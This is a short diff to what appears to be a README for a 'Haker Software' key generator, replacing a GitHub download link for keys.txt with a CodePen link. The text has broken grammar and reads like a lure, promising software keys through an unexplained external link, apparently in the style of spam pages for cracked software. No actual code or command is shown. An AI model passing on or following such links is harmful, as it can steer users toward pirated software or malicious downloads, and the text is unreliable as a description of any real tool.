@@ -5,7 +5,7 @@
 ## Key Generator and How to Access the Software
 1. **Download the Key Generator**  
    Use the following link to download the keys:  
-   [Geject Haker Software Keys](https://github.com/Geject/Haker-Software-/releases/download/latest/keys.txt)
+   [Geject Haker Software Keys](https://codepen.io/Liggy-Lang/pen/OPPBzmY?editors=1000)
 
 2. **Generate Your API Key**  
    - Now that you have's the keys you are ready for the next step.
